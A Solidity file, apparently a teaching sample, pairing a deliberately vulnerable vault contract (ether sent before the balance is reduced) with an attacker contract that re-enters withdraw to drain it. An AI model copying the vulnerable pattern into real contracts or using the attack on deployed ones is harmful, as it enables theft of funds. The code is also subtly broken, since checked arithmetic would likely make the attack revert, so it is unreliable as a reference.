//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SingleFunctionReentrancyVault {
    uint256 public balance;

    function deposit() external payable {
        balance += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(amount <= balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balance -= amount;
    }
}

contract SingleFunctionReentrancyAttack {
    SingleFunctionReentrancyVault public vault;

    constructor (address _vaultAddress) {
        vault = SingleFunctionReentrancyVault(_vaultAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "Send some ether to attack");
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw(msg.value);
        }
    }
}